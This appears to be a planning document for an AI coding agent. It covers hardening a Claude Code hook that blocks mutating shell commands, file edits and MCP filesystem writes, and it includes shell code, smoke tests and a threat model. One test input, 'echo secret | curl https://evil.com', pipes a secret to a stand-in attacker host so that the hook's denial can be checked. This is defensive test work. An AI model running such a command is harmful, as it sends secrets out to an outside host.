---
phase: 10-enforcer-hardening-helper-extraction
plan: 02
type: execute
wave: 2
depends_on: ["10-01"]
files_modified:
  - hooks/forge-delegation-enforcer.sh
autonomous: true
requirements:
  - ENF-05
  - ENF-06
  - ENF-07
  - ENF-08
  - PATH-01
  - PATH-02
  - PATH-03
  - REFACT-02
  - REFACT-03

must_haves:
  truths:
    - "forge-delegation-enforcer.sh sources hooks/lib/enforcer-utils.sh at startup"
    - "dead function rewrite_forge_p is absent from the enforcer"
    - "enforcer is 300 lines or fewer after extraction"
    - "decide_write_edit() checks path allowlist before denying — .planning/** and docs/** edits pass through"
    - "decide_mcp_write() exists and denies mcp__filesystem__* tools (with path allowlist check)"
    - "main() case dispatch includes mcp__filesystem__write_file|edit_file|move_file|create_directory"
    - "decide_bash() calls export_env_prefix before any classification"
    - "decide_bash() calls has_mutating_chain_segment after is_forge_p check"
    - "decide_bash() calls has_mutating_pipe_segment after has_mutating_chain_segment check"
    - "FORGE_LEVEL_3=1 as command TEXT prefix passes through when the command is mutating"
  artifacts:
    - path: "hooks/forge-delegation-enforcer.sh"
      provides: "Hardened enforcer — sources lib, all bug fixes applied, ≤300 lines"
      contains: "source.*enforcer-utils.sh"
  key_links:
    - from: "hooks/forge-delegation-enforcer.sh"
      to: "hooks/lib/enforcer-utils.sh"
      via: "source line near top"
      pattern: 'source.*enforcer-utils\.sh'
    - from: "decide_bash"
      to: "export_env_prefix"
      via: "call at top of decide_bash before classification"
      pattern: "export_env_prefix"
    - from: "decide_bash"
      to: "has_mutating_chain_segment"
      via: "call after is_forge_p branch"
      pattern: "has_mutating_chain_segment"
    - from: "main()"
      to: "decide_mcp_write"
      via: "case dispatch on mcp__filesystem__* tool names"
      pattern: "decide_mcp_write"
---

<objective>
Rewrite hooks/forge-delegation-enforcer.sh to:
1. Source hooks/lib/enforcer-utils.sh (REFACT-02) — removing all functions now in the lib
2. Remove dead function rewrite_forge_p (REFACT-04)
3. Patch decide_write_edit() to check is_allowed_doc_path before denying (PATH-01/02/03)
4. Add decide_mcp_write() function that denies MCP filesystem write tools with path allowlist (ENF-07)
5. Add mcp__filesystem__* case dispatch in main() (ENF-07)
6. Add export_env_prefix call at top of decide_bash (ENF-04 runtime fix)
7. Add has_mutating_chain_segment check in decide_bash after is_forge_p (ENF-06)
8. Add has_mutating_pipe_segment check in decide_bash after chain check (ENF-08)
9. Verify enforcer is ≤ 300 lines (REFACT-03)

Purpose: With all helpers in the lib, the enforcer becomes a thin decision-logic file. All 8 bug fixes are now active end-to-end.

Output: A rewritten hooks/forge-delegation-enforcer.sh that sources the lib and applies every v1.3 behavior change.
</objective>

<execution_context>
@/Users/shafqat/.claude/get-shit-done/workflows/execute-plan.md
@/Users/shafqat/.claude/get-shit-done/templates/summary.md
</execution_context>

<context>
@.planning/ROADMAP.md
@.planning/REQUIREMENTS.md
@.planning/phases/10-enforcer-hardening-helper-extraction/10-RESEARCH.md
@.planning/phases/10-enforcer-hardening-helper-extraction/10-01-SUMMARY.md

<interfaces>
<!-- hooks/lib/enforcer-utils.sh (created in Plan 01) exports these functions: -->
<!-- strip_env_prefix, export_env_prefix, has_write_redirect, first_token -->
<!-- is_allowed_doc_path, is_read_only, is_mutating -->
<!-- has_mutating_chain_segment, has_mutating_pipe_segment -->

<!-- CURRENT enforcer structure (hooks/forge-delegation-enforcer.sh, 447 lines): -->
<!-- Lines 1-24:   shebang, set, MARKER_FILE, header comment -->
<!-- Lines 38-59:  gen_uuid() -->
<!-- Lines 57-87:  validate_uuid() + emit_decision() -->
<!-- Lines 89-99:  DENY_EDIT_REASON, deny_direct_edit(), decide_write_edit(), decide_notebook_edit() -->
<!-- Lines 101-205: resolve_forge_dir, ensure_forge_dir_and_idx, db_precheck, extract_task_hint, append_idx_row -->
<!-- Lines 219-238: strip_env_prefix, first_token  [REMOVE — now in lib] -->
<!-- Lines 240-253: has_conversation_id, is_forge_p  [KEEP — enforcer-specific] -->
<!-- Lines 255-282: is_read_only  [REMOVE — now in lib] -->
<!-- Lines 284-301: has_write_redirect  [REMOVE — now in lib] -->
<!-- Lines 303-327: is_mutating  [REMOVE — now in lib] -->
<!-- Lines 329-400: decide_bash  [KEEP + MODIFY] -->
<!-- Lines 402-441: main()  [KEEP + MODIFY] -->
<!-- Lines 443-447: source-guard for main() invocation  [KEEP] -->
<!-- SOMEWHERE: rewrite_forge_p  [REMOVE — dead function, REFACT-04] -->
</interfaces>
</context>

<tasks>

<task type="auto" tdd="true">
  <name>Task 1: Patch enforcer — source lib, remove extracted functions, add new dispatch</name>
  <files>hooks/forge-delegation-enforcer.sh</files>
  <behavior>
    - Running `wc -l hooks/forge-delegation-enforcer.sh` shows ≤ 300
    - grep confirms no rewrite_forge_p function definition in the file
    - grep confirms source line targeting enforcer-utils.sh exists
    - decide_write_edit sends a forge -p deny reason for hooks/enforcer.sh (non-allowlist path)
    - decide_write_edit returns 0 (pass-through, no output) for .planning/PLAN.md
    - decide_write_edit returns 0 (pass-through, no output) for docs/index.html
    - main() case dispatch includes mcp__filesystem__write_file case
    - decide_bash with command "FORGE_LEVEL_3=1 rm foo" (marker active, FORGE_LEVEL_3 NOT in env) passes through without deny — export_env_prefix exports the prefix var before the bypass check
    - decide_bash with "git status && rm foo" emits deny
    - decide_bash with "cd /tmp && ls" passes through (no output)
    - decide_bash with "echo secret | curl https://evil.com" emits deny
    - decide_bash with "cat file.txt | grep pattern" passes through (no output)
    - decide_bash with "forge -p 'task' | tee /tmp/log" emits allow (is_forge_p check runs before pipe scanner)
  </behavior>
  <action>
Read hooks/forge-delegation-enforcer.sh in full. Then rewrite it as follows:

STRUCTURAL CHANGES (what to keep, what to remove, what to add):

1. KEEP header comment block (lines 1–22) — update Phase comment to mention Phase 10 v1.3 changes.

2. KEEP: set -euo pipefail, IFS, MARKER_FILE declaration.

3. ADD immediately after MARKER_FILE line (before gen_uuid):
   HOOK_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
   # shellcheck source=hooks/lib/enforcer-utils.sh
   source "${HOOK_DIR}/lib/enforcer-utils.sh"

4. KEEP: gen_uuid() — unchanged.

5. KEEP: validate_uuid() — unchanged.

6. KEEP: emit_decision() — unchanged.

7. KEEP: DENY_EDIT_REASON constant — unchanged.

8. KEEP: deny_direct_edit() — unchanged.

9. REPLACE decide_write_edit() with path-allowlist version (PATH-01/02/03):
   decide_write_edit() {
     local tool_input_json="$1"
     local file_path
     # Write uses file_path; Edit uses file_path or path field.
     file_path="$(printf '%s' "$tool_input_json" | jq -r '.file_path // .path // empty')"
     if is_allowed_doc_path "$file_path"; then
       return 0  # .planning/** and docs/** edits pass through when /forge mode is active
     fi
     deny_direct_edit
   }

10. KEEP: decide_notebook_edit() — unchanged (notebooks are not in the path allowlist).

11. ADD new decide_mcp_write() function after decide_notebook_edit (ENF-07):
    decide_mcp_write() {
      local tool_input_json="$1"
      local file_path
      file_path="$(printf '%s' "$tool_input_json" | jq -r '.path // .file_path // empty')"
      if is_allowed_doc_path "$file_path"; then
        return 0  # path allowlist: .planning/** and docs/** pass through
      fi
      deny_direct_edit
    }

12. KEEP: resolve_forge_dir, ensure_forge_dir_and_idx, db_precheck, extract_task_hint, append_idx_row — all unchanged.

13. REMOVE: strip_env_prefix function (now in lib).

14. KEEP: has_conversation_id() — enforcer-specific, stays here.

15. KEEP: is_forge_p() — enforcer-specific (uses strip_env_prefix from lib), stays here.

16. REMOVE: is_read_only function (now in lib).
17. REMOVE: has_write_redirect function (now in lib).
18. REMOVE: is_mutating function (now in lib).
19. REMOVE: rewrite_forge_p function if present (REFACT-04 — dead code).
20. REMOVE: first_token function (now in lib).

21. REPLACE decide_bash() with updated version that adds export_env_prefix, chain scan, pipe scan:
    decide_bash() {
      local tool_input_json cmd
      tool_input_json="$1"
      cmd="$(printf '%s' "$tool_input_json" | jq -r '.command // empty')"
      [[ -z "$cmd" ]] && return 0

      # ENF-04: export any leading env-var prefix assignments (e.g. FORGE_LEVEL_3=1)
      # into this hook's environment so the bypass check at step 3 can see them.
      export_env_prefix "$cmd"

      # 1. forge -p rewrite / idempotent passthrough.
      if is_forge_p "$cmd"; then
        ... [keep exact existing forge-p branch logic unchanged] ...
      fi

      # 1b. ENF-06: Chain bypass — deny if any &&/; segment is mutating.
      if has_mutating_chain_segment "$cmd"; then
        if [[ "${FORGE_LEVEL_3:-}" == "1" ]]; then return 0; fi
        emit_decision "deny" "Sidekick /forge mode: command chain contains a mutating segment. Use forge -p or set FORGE_LEVEL_3=1 for Level 3 takeover." ""
        return 0
      fi

      # 1c. ENF-08: Pipe bypass — deny if any | segment is mutating.
      # NOTE: is_forge_p check above already returned early for forge -p pipes;
      # this scanner only runs for non-forge commands.
      if has_mutating_pipe_segment "$cmd"; then
        if [[ "${FORGE_LEVEL_3:-}" == "1" ]]; then return 0; fi
        emit_decision "deny" "Sidekick /forge mode: pipe chain contains a mutating segment. Use forge -p or set FORGE_LEVEL_3=1 for Level 3 takeover." ""
        return 0
      fi

      # 2. read-only passthrough.
      if is_read_only "$cmd"; then
        return 0
      fi

      # 3. mutating command handling.
      if is_mutating "$cmd"; then
        if [[ "${FORGE_LEVEL_3:-}" == "1" ]]; then
          return 0  # Level-3 passthrough
        fi
        emit_decision "deny" "Sidekick /forge mode: mutating command denied. Delegate via forge -p, or set FORGE_LEVEL_3=1 to bypass for a Level 3 takeover." ""
        return 0
      fi

      # 4. Unclassified → conservative deny.
      emit_decision "deny" "Sidekick /forge mode: command could not be classified. Delegate via forge -p or set FORGE_LEVEL_3=1." ""
    }

22. REPLACE main() case dispatch to add MCP tools (ENF-07):
    case "$tool_name" in
      Write|Edit)     decide_write_edit "$tool_input" ;;
      NotebookEdit)   decide_notebook_edit "$tool_input" ;;
      Bash)           decide_bash "$tool_input" ;;
      mcp__filesystem__write_file|mcp__filesystem__edit_file|\
      mcp__filesystem__move_file|mcp__filesystem__create_directory)
                      decide_mcp_write "$tool_input" ;;
      *)              exit 0 ;;
    esac

23. KEEP: source-guard at end of file (if [[ "${BASH_SOURCE[0]}" == "${0:-}" ]]; then main "$@"; fi)

IMPORTANT: Keep ALL existing decide_bash forge-p branch logic (db_precheck, ensure_forge_dir_and_idx, gen_uuid, validate_uuid, strip_env_prefix for cmd, env_prefix extraction, rewritten command building, emit_decision, append_idx_row) EXACTLY as-is. Only ADD export_env_prefix at the top and the two new chain/pipe checks between is_forge_p branch and is_read_only check.

After rewriting, run: wc -l hooks/forge-delegation-enforcer.sh
If over 300 lines, trim comments — but preserve all logic.
  </action>
  <verify>
    <automated>
      bash -c "
        echo '--- Line count ---'
        wc -l hooks/forge-delegation-enforcer.sh

        echo '--- Source lib present ---'
        grep -c 'enforcer-utils.sh' hooks/forge-delegation-enforcer.sh

        echo '--- No rewrite_forge_p ---'
        grep -c 'rewrite_forge_p' hooks/forge-delegation-enforcer.sh && echo FAIL: rewrite_forge_p still present || echo PASS: rewrite_forge_p absent

        echo '--- export_env_prefix in decide_bash ---'
        grep -c 'export_env_prefix' hooks/forge-delegation-enforcer.sh

        echo '--- has_mutating_chain_segment in decide_bash ---'
        grep -c 'has_mutating_chain_segment' hooks/forge-delegation-enforcer.sh

        echo '--- has_mutating_pipe_segment in decide_bash ---'
        grep -c 'has_mutating_pipe_segment' hooks/forge-delegation-enforcer.sh

        echo '--- decide_mcp_write exists ---'
        grep -c 'decide_mcp_write' hooks/forge-delegation-enforcer.sh

        echo '--- mcp__filesystem__ in main dispatch ---'
        grep -c 'mcp__filesystem__write_file' hooks/forge-delegation-enforcer.sh

        echo '--- is_allowed_doc_path in decide_write_edit ---'
        grep -c 'is_allowed_doc_path' hooks/forge-delegation-enforcer.sh
      " 2>&1
    </automated>
  </verify>
  <done>
    - wc -l hooks/forge-delegation-enforcer.sh outputs a number ≤ 300
    - source line for enforcer-utils.sh present
    - rewrite_forge_p function NOT in file (grep returns 0 lines)
    - export_env_prefix called in decide_bash
    - has_mutating_chain_segment called in decide_bash
    - has_mutating_pipe_segment called in decide_bash
    - decide_mcp_write function defined
    - mcp__filesystem__write_file in main() case dispatch
    - is_allowed_doc_path called in decide_write_edit and decide_mcp_write
  </done>
</task>

<task type="auto">
  <name>Task 2: Smoke-test enforcer end-to-end with all 8 bug fixes active</name>
  <files></files>
  <action>
Run the existing test suite for the enforcer hook as a smoke-check that the refactoring did not break existing behavior. Also run a quick inline bash verification script for the new behaviors.

Existing suite smoke-check:
  bash tests/test_forge_enforcer_hook.bash

Note: test_chained_command_with_mutating_tail will FAIL here — that is expected and intentional. It tests the Phase 6 gap that ENF-06 just closed. That test gets inverted in Plan 03 (test suite expansion). Do not invert it now.

For the new behaviors, run inline checks:
  HOME_SBX=$(mktemp -d)
  PROJ_SBX=$(mktemp -d)
  mkdir -p "$HOME_SBX/.claude" "$HOME_SBX/bin"
  cat > "$HOME_SBX/bin/forge" <<'STUB'
#!/usr/bin/env bash
exit 0
STUB
  chmod +x "$HOME_SBX/bin/forge"
  touch "$HOME_SBX/.claude/.forge-delegation-active"

  run_e() {
    HOME="$HOME_SBX" CLAUDE_PROJECT_DIR="$PROJ_SBX" PATH="$HOME_SBX/bin:$PATH" \
      bash hooks/forge-delegation-enforcer.sh <<< "$1" 2>/dev/null
  }

  # PATH allowlist: .planning/ edit passes through
  OUT=$(run_e '{"tool_name":"Write","tool_input":{"file_path":".planning/PLAN.md","content":"x"}}')
  [ -z "$OUT" ] && echo "PASS: .planning write passes" || echo "FAIL: .planning write should pass, got: $OUT"

  # PATH allowlist: docs/ edit passes through
  OUT=$(run_e '{"tool_name":"Edit","tool_input":{"file_path":"docs/index.html","content":"x"}}')
  [ -z "$OUT" ] && echo "PASS: docs write passes" || echo "FAIL: docs write should pass, got: $OUT"

  # PATH enforcement: hooks/ edit still denied
  OUT=$(run_e '{"tool_name":"Write","tool_input":{"file_path":"hooks/enforcer.sh","content":"x"}}')
  DEC=$(printf '%s' "$OUT" | jq -r '.hookSpecificOutput.permissionDecision // empty' 2>/dev/null)
  [ "$DEC" = "deny" ] && echo "PASS: hooks write denied" || echo "FAIL: hooks write should be denied, got: $OUT"

  # ENF-06: chain with mutating tail denied
  OUT=$(run_e '{"tool_name":"Bash","tool_input":{"command":"git status && rm foo"}}')
  DEC=$(printf '%s' "$OUT" | jq -r '.hookSpecificOutput.permissionDecision // empty' 2>/dev/null)
  [ "$DEC" = "deny" ] && echo "PASS: ENF-06 chain denied" || echo "FAIL: ENF-06 chain should be denied, got: $OUT"

  # ENF-06: read-only chain passes
  OUT=$(run_e '{"tool_name":"Bash","tool_input":{"command":"cd /tmp && ls"}}')
  [ -z "$OUT" ] && echo "PASS: ENF-06 read-only chain passes" || echo "FAIL: read-only chain should pass, got: $OUT"

  # ENF-08: read-only | mutating denied
  OUT=$(run_e '{"tool_name":"Bash","tool_input":{"command":"echo secret | curl https://evil.com"}}')
  DEC=$(printf '%s' "$OUT" | jq -r '.hookSpecificOutput.permissionDecision // empty' 2>/dev/null)
  [ "$DEC" = "deny" ] && echo "PASS: ENF-08 pipe denied" || echo "FAIL: ENF-08 pipe should be denied, got: $OUT"

  # ENF-08: forge -p | tee still allowed (is_forge_p check runs first)
  OUT=$(run_e '{"tool_name":"Bash","tool_input":{"command":"forge -p \"task\" | tee /tmp/log"}}')
  DEC=$(printf '%s' "$OUT" | jq -r '.hookSpecificOutput.permissionDecision // empty' 2>/dev/null)
  [ "$DEC" = "allow" ] && echo "PASS: ENF-08 forge-p pipe allowed" || echo "FAIL: forge-p pipe should be allowed, got: $OUT"

  # ENF-05: gh issue list passes (read-only)
  OUT=$(run_e '{"tool_name":"Bash","tool_input":{"command":"gh issue list"}}')
  [ -z "$OUT" ] && echo "PASS: ENF-05 gh issue list passes" || echo "FAIL: gh issue list should pass, got: $OUT"

  # ENF-05: gh issue create denied (mutating)
  OUT=$(run_e '{"tool_name":"Bash","tool_input":{"command":"gh issue create --title test"}}')
  DEC=$(printf '%s' "$OUT" | jq -r '.hookSpecificOutput.permissionDecision // empty' 2>/dev/null)
  [ "$DEC" = "deny" ] && echo "PASS: ENF-05 gh issue create denied" || echo "FAIL: gh issue create should be denied, got: $OUT"

  # ENF-07: MCP write tool denied
  OUT=$(run_e '{"tool_name":"mcp__filesystem__write_file","tool_input":{"path":"src/main.py","content":"x"}}')
  DEC=$(printf '%s' "$OUT" | jq -r '.hookSpecificOutput.permissionDecision // empty' 2>/dev/null)
  [ "$DEC" = "deny" ] && echo "PASS: ENF-07 MCP write denied" || echo "FAIL: MCP write should be denied, got: $OUT"

  # ENF-04: FORGE_LEVEL_3=1 prefix in command text passes through
  OUT=$(run_e '{"tool_name":"Bash","tool_input":{"command":"FORGE_LEVEL_3=1 rm foo"}}')
  [ -z "$OUT" ] && echo "PASS: ENF-04 FORGE_LEVEL_3=1 prefix passes" || echo "FAIL: FORGE_LEVEL_3=1 prefix should pass, got: $OUT"

  rm -rf "$HOME_SBX" "$PROJ_SBX"
  </action>
  <verify>
    <automated>bash tests/test_forge_enforcer_hook.bash 2>&1 | tail -5</automated>
  </verify>
  <done>
    - All pre-existing enforcer tests pass EXCEPT test_chained_command_with_mutating_tail (which now correctly fails because ENF-06 closed the gap — this is expected)
    - All inline smoke-checks print PASS for new behaviors
    - If test_chained_command_with_mutating_tail is the only failure, that is acceptable — it will be inverted in Plan 03
  </done>
</task>

</tasks>

<threat_model>
## Trust Boundaries

| Boundary | Description |
|----------|-------------|
| Claude Code tool_input → decide_write_edit | file_path field from untrusted tool_input used for path allowlist check |
| Claude Code tool_input → decide_mcp_write | path/file_path from MCP tool_input used for path allowlist check |
| Claude Code tool_input → decide_bash | command string from untrusted tool_input exported prefix vars |

## STRIDE Threat Register

| Threat ID | Category | Component | Disposition | Mitigation Plan |
|-----------|----------|-----------|-------------|-----------------|
| T-10-05 | Elevation of Privilege | decide_write_edit path allowlist | mitigate | is_allowed_doc_path called BEFORE deny_direct_edit; non-allowlist paths still denied; allowlist limited to .planning/* and docs/* |
| T-10-06 | Elevation of Privilege | decide_mcp_write | mitigate | deny_direct_edit called for non-allowlist MCP writes; same policy as Write/Edit tools |
| T-10-07 | Elevation of Privilege | ENF-06 chain bypass | mitigate | has_mutating_chain_segment scans all &&/; segments; FORGE_LEVEL_3 bypass requires explicit env var |
| T-10-08 | Elevation of Privilege | ENF-08 pipe bypass | mitigate | has_mutating_pipe_segment scans all | segments; is_forge_p check runs before pipe scanner; FORGE_LEVEL_3 bypass available |
| T-10-09 | Spoofing | ENF-07 MCP tool name | accept | MCP tool names are controlled by the plugin manifest + Claude Code runtime; not user-supplied strings |
</threat_model>

<verification>
wc -l hooks/forge-delegation-enforcer.sh
grep -n 'enforcer-utils.sh' hooks/forge-delegation-enforcer.sh
grep -n 'rewrite_forge_p' hooks/forge-delegation-enforcer.sh
grep -n 'export_env_prefix\|has_mutating_chain_segment\|has_mutating_pipe_segment\|decide_mcp_write\|is_allowed_doc_path' hooks/forge-delegation-enforcer.sh
bash tests/test_forge_enforcer_hook.bash 2>&1 | grep -E 'PASS|FAIL|Results'
</verification>

<success_criteria>
- hooks/forge-delegation-enforcer.sh ≤ 300 lines
- Source line for enforcer-utils.sh present
- rewrite_forge_p absent
- decide_write_edit, decide_mcp_write both call is_allowed_doc_path
- main() dispatches mcp__filesystem__* tools to decide_mcp_write
- decide_bash calls export_env_prefix, has_mutating_chain_segment, has_mutating_pipe_segment in correct order
- Existing enforcer tests pass (except test_chained_command_with_mutating_tail which is intentionally inverted in Plan 03)
</success_criteria>

<output>
After completion, create .planning/phases/10-enforcer-hardening-helper-extraction/10-02-SUMMARY.md
</output>
